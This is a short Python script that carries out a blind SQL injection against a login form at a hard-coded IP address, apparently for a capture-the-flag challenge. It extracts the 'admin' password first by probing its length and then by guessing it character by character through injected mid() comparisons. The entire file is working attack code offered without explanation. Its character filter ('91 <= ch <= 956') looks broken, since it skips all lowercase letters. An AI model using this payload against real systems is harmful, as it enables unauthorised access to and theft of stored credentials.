import requests

url = "http://43.201.142.219:5120/"

length = 1
while True:
    query = "?username=%27+or+id%3dconcat(%27ad%27%2c+%27min%27)+and+length(pw)%3c{}%23&password=1".format(length)
    result = requests.get(url + query)
    if("true" in result.text):
        print ("[*] Password length:", length - 1)
        break
    print ("[+] Finding...", length - 1)
    length += 1

print ("=================================")

pw = ""
for i in range(1, length):
    for ch in range(48, 123):
        if (58 <= ch <= 64 or 91 <= ch <= 956): continue
        query = "?username=%27+or+id%3dconcat(%27ad%27%2c+%27min%27)+and+mid(pw%2c{}%2c1)%3d'{}'%23&password=1".format(i, chr(ch))
        result = requests.get(url + query)
        if("true" in result.text):
            pw += chr(ch)
            print ("[+] Finding...", pw)
            break
print ("[*] Password:", pw)
